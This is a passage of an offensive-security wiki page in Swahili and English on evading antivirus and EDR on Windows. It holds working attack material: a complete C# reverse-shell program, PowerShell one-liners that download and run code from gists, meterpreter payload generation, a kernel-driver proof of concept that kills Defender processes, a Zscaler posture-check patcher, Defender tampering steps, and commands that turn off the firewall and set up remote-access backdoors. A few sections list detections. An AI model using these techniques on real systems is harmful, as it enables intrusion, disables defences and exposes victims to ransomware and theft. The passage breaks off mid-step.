SmartScreen kwa kawaida hufanya kazi kwa njia ya reputation-based approach, ikimaanisha kwamba applications ambazo hazipakuliwa mara kwa mara zitatia alarm SmartScreen na hivyo kuonya na kuzuia mtumiaji wa mwisho kuendesha faili (ingawa faili bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni NTFS Alternate Data Stream yenye jina Zone.Identifier ambayo huundwa moja kwa moja wakati wa kupakua faili kutoka kwenye mtandao, pamoja na URL kutoka ambako ilipakuliwa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua ADS ya Zone.Identifier kwa faili iliyopakuliwa kutoka mtandaoni.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba faili za .exe zilizotiwa saini kwa cheti cha saini **kinachotambulika** hazitachochea SmartScreen.

Njia yenye ufanisi mkubwa ya kuzuia payload zako kupata Mark of The Web ni kuzifungasha ndani ya aina fulani ya kontena kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye **volumu zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayofunga payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hapa kuna demo ya kupitisha SmartScreen kwa kufunga payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanismi yenye nguvu ya logging katika Windows inayoruhusu applications na system components **kurekodi matukio**. Hata hivyo, inaweza pia kutumiwa na security products kufuatilia na kugundua shughuli hatarishi.

Sawa na jinsi AMSI inavyofungwa (bypassed) pia inawezekana kufanya function ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hii inafanywa kwa kupatch function hiyo katika memory ili irudi mara moja, kwa ufanisi kuzuia kurekodiwa kwa ETW kwa mchakato huo.

Unaweza kupata habari zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory imejulikana kwa muda sasa na bado ni njia nzuri sana ya kuendesha tools zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutakuwa tukihangaika tu na kupatch AMSI kwa mchakato mzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari hutoa uwezo wa kuendesha C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa kujitoa (sacrificial process)**, ku-inject code yako ya ubaya ya post-exploitation ndani ya mchakato huo mpya, kuendesha code yako ya ubaya na unapomaliza, kuua mchakato huo mpya. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii inamaanisha kwamba ikiwa kitu katika hatua yetu ya post-exploitation kitakwenda vibaya au kimekamaliwa, kuna **nafasi kubwa zaidi** ya **implant yetu kuishi.** Hasara ni kwamba una **nafasi kubwa zaidi** ya kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu ku-inject code yako ya ubaya ya post-exploitation **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kukaguliwa na AV, lakini hasara ni kwamba ikiwa kitu kitakwenda vibaya katika utekelezaji wa payload yako, kuna **nafasi kubwa zaidi** ya **kupoteza beacon** kwani inaweza kuanguka.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kuendesha code ya ubaya kwa kutumia lugha nyingine kwa kumruhusu mashine iliyodukuliwa kupata access **kwa interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu access kwa Interpreter Binaries na environment kwenye SMB share unaweza **kuendesha arbitrary code katika hizi lugha ndani ya memory** ya mashine iliyodukuliwa.

Repo inasema: Defender bado inakagua scripts lakini kwa kutumia Go, Java, PHP n.k. tunapata **flexibility zaidi ya kupitisha static signatures**. Majaribio na random un-obfuscated reverse shell scripts katika hizi lugha yameonyesha mafanikio.

## TokenStomping

Token stomping ni mbinu inayomruhusu mshambuliaji **kuathiri access token au security product kama EDR au AV**, na kuwawezesha kupunguza privileges yake ili mchakato usife lakini usiwe na ruhusa za kukagua shughuli hatarishi.

Ili kuzuia hili Windows inaweza **kuzuia mchakato za nje** kupata handles juu ya tokens za mchakato za usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Imeaminika

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusambaza Chrome Remote Desktop kwenye PC ya mhusika na kisha kuitumia kumkamata na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili ya MSI ya Windows kupakua faili ya MSI.
2. Endesha installer kwa kimya kwenye mashine ya mhusika (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard itakuuliza kuidhinisha; bonyeza kitufe cha Authorize ili kuendelea.
4. Endesha parameter iliyotolewa na marekebisho machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin inayoruhusu kuweka pin bila kutumia GUI).

## Kujificha kwa Ngazi ya Juu

Kuepuka kugunduliwa ni mada ngumu sana, wakati mwingine unapaswa kuzingatia vyanzo tofauti vya telemetry ndani ya mfumo mmoja, hivyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyoendelea.

Kila mazingira utakayokabiliana nayo itakuwa na nguvu na udhaifu wake.

Ninakutia moyo sana uangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate ufahamu wa Mbinu zaidi za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

hii pia ni hotuba nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Kale**

### **Angalia sehemu ambazo Defender inaona kuwa hatarishi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itafanya **kuondoa sehemu za binary** mpaka itakapogundua **sehemu gani Defender** inaiona kuwa hatarishi na kukuonyesha.\
Tool nyingine inayofanya **kitu hicho ni** [**avred**](https://github.com/dobin/avred) yenye tovuti ya wazi inayotoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kusakinisha (kama administrator) ukifanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye ianze (**start**) wakati mfumo unapozinduliwa na iendeshe (**run**) sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zimamisha firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, sio setup)

**ON THE HOST**: Endesha _**winvnc.exe**_ na sanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri kwenye _VNC Password_
- Weka nenosiri kwenye _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili iliyoundwa **mpya** _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

The **attacker** anapaswa **endesha ndani** host yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kubaki fiche lazima usifanye mambo machache

- Usianze `winvnc` ikiwa tayari inaendesha au utasababisha [popup](https://i.imgur.com/1SROTTl.png). angalia kama inaendesha kwa `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` kwenye directory ile ile au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usitekeleze `winvnc -h` kwa msaada au utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** na:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atawaacha mchakato kwa haraka sana.**

### Ku-compile reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya kwanza

I-compile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na utekelezaji wa kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Tuletee Driver Yako Yenye Udhaifu (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia utiliti ndogo ya console iitwayo **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kupeleka ransomware. Zana hii inaleta **driver yake mwenyewe mwenye udhaifu lakini *signed*** na kuitumia kutoa shughuli za kernel zenye cheo ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.

Mambo muhimu
1. **Signed driver**: Faili iliyowekwa diski ni `ServiceMouse.sys`, lakini binary ni driver iliyosainiwa kisheria `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inaweza kupakia hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaanza ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Uwezo                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kumaliza mchakato wowote kwa PID (kutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Futa faili yoyote kwenye diski |
| `0x990001D0` | Ondoa driver na ufute huduma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD inapita kabisa ulinzi wa user-mode; msimbo unaoendeshwa katika kernel unaweza kufungua michakato *iliyolindwa*, kuimaliza, au kuingilia vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.

Utambuzi / Kupunguza
• Washa orodha ya Microsoft ya kuzuia driver zilizo na udhaifu (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.  
• Fuatilia uundaji wa huduma mpya za *kernel* na toa tahadhari wakati driver inapakiwa kutoka kwenye saraka inayoweza kuandikwa na kila mtu au haipo kwenye orodha ya kuruhusiwa.  
• Angalia kushikiliwa kwa handles za user-mode za vitu vya kifaa maalum ikifuatiwa na simu za kushuku za `DeviceIoControl`.

### Kuepuka Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** inaweka sheria za hali ya kifaa (device-posture) kwa ndani na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Uchaguzi mbili mbovu za muundo zinafanya kuepuka kabisa kuwa rahisi:

1. Tathmini ya posture hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).  
2. Mababu za RPC za ndani zinathibitisha tu kwamba executable inayounganisha imehifadhiwa na Zscaler (kupitia `WinVerifyTrust`).

Kwa kuharibu binaries nne zilizosainiwa kwenye diski, mbinu zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara hivyo kila ukaguzi unafaa |
| `ZSAService.exe` | Mwito usio wa moja kwa moja kwa `WinVerifyTrust` | NOP-ed ⇒ mchakato yeyote (hata usiosainiwa) unaweza kuunganisha kwenye pipes za RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imebadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu kwenye tunnel | Imekatizwa |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuanzisha upya stack ya huduma:

* **Yote** majaribio ya posture yanaonyesha **kijani/yanakubaliana**.
* Binaries zisizotiwa sahihi au zilizobadilishwa zinaweza kufungua endpoints za RPC za named-pipe (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Mashine iliyodhulumiwa inapata ufikiaji usiozuiliwa kwenye mtandao wa ndani uliowekwa na sera za Zscaler.

Kesi hii ya utafiti inaonyesha jinsi maamuzi ya kuamini upande wa mteja pekee na ukaguzi rahisi wa saini yanavyoweza kushindwa kwa marekebisho ya byte chache.

## Kutumia vibaya Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza muundo wa hadhi wa signer/level ili tu protected processes zenye hadhi ileile au ya juu zinaweza kuingilia au kubadilisha kila moja. Kwa upande wa shambulio, ikiwa unaweza kuanzisha kwa halali binary iliyo na PPL na kudhibiti arguments zake, unaweza kubadilisha utendaji usio hatari (mfano, logging) kuwa primitive ya kuandika yenye mipaka, inayoungwa mkono na PPL, dhidi ya saraka zilizo na ulinzi zinazotumika na AV/EDR.

Nini kinachofanya process iendeshe kama PPL
- The target EXE (na DLLs zozote zilizopakuliwa) lazima zisainiwe na EKU inayoweza PPL.
- Mchakato lazima uundwe kwa CreateProcess ukitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima ootwe kiwango cha ulinzi kinachofaa kinacholingana na signer wa binary (mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa wasaini wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa wasaini wa Windows). Viwango visivyo sahihi vitashindwa wakati wa uundaji.

Tazama pia utangulizi mpana wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za kuanzisha
- Msaidizi wa open-source: CreateProcessAsPPL (huchagua protection level na hupitisha arguments kwa EXE lengwa):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Mfano wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyotiwa saini `C:\Windows\System32\ClipUp.exe` huanzisha mchakato wake mwenyewe na inakubali parameter ya kuandika faili ya log kwenye njia iliyobainishwa na muombaji.
- Wakati inapoanzishwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa msaada wa PPL.
- ClipUp haiwezi kuchambua njia zenye nafasi; tumia 8.3 short paths kuelekeza kwenye maeneo yaliyolindwa kawaida.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mnyororo wa matumizi mabaya (muhtasari)
1) Anzisha LOLBIN yenye uwezo wa PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pita argument ya log-path ya ClipUp ili kulazimisha uundaji wa faili katika directory ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikiwa inahitajika.
3) Ikiwa binary lengwa kawaida huwa wazi/imefungwa na AV wakati inapoendesha (mfano, MsMpEng.exe), panga uandishi ufanyike wakati wa boot kabla AV haijaanza kwa kusanidi service ya auto-start ambayo inaendesha mapema kwa uhakika. Thibitisha mfuatano wa boot kwa Process Monitor (boot logging).
4) Baada ya reboot, uandishi unaoungwa mkono na PPL hutokea kabla AV haifunga binaries zake, ukiharibu faili lengwa na kuzuia kuanzishwa.

Mfano wa invocation (paths zimefichwa/kufupishwa kwa usalama):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya nafasi; primitive hii inafaa kwa uharibifu badala ya kuingiza maudhui kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusanidi/kuanzisha service na kipindi cha reboot.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huzuia file locks.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` kwa hoja zisizo za kawaida, hasa ukiwa umezaliwa na launchers zisizo za kawaida, karibu na boot.
- Services mpya zimesanidiwa kuanza kwa auto-start binaries ambazo zinashukuwa na kuanza kwa mfululizo kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa startup ya Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/Platform directories za Defender; uundaji/urekebishaji wa faili usiotarajiwa na michakato yenye alama za protected-process.
- ETW/EDR telemetry: tafuta michakato iliyoanzishwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya ngazi ya PPL na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni binaries zipi zilizosainiwa zinaweza kuendesha kama PPL na chini ya wazazi gani; zuia ClipUp kuitwa nje ya muktadha halali.
- Service hygiene: punguza uundaji/urekebishaji wa services za auto-start na fuatilia udanganyifu wa mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimeshawashwa; chunguza makosa ya startup yanayoonyesha uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi tooling za usalama ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform ambayo inaendeshwa kutoka kwa kuorodhesha subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye kamba ya toleo inayopangiliwa juu zaidi kwa leksikografia (mfano, `4.18.25070.5-0`), kisha huanza michakato ya service ya Defender kutoka hapo (kikirekebisha service/registry paths ipasavyo). Uteuzi huu unaamini vitu vya saraka ikiwemo directory reparse points (symlinks). Msimamizi anaweza kutumia hili kupitisha Defender kwenye njia inayoweza kuandikwa na mshambulizi na kupata DLL sideloading au kushindwa kwa service.

Preconditions
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa ku-reboot au kusababisha Defender platform re-selection (service restart on boot)
- Zana za ndani tu zinahitajika (mklink)

Why it works
- Defender inalizuia kuandika katika folda zake mwenyewe, lakini uchaguzi wake wa platform unaamini directory entries na kuchagua toleo linalopangwa juu kwa leksikografia bila kuthibitisha kwamba lengo linatambuliwa kuwa njia iliyo na ulinzi/kuaminika.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink wa saraka ya toleo la juu ndani ya Platform linaloelekeza kwenye saraka yako:
```cmd
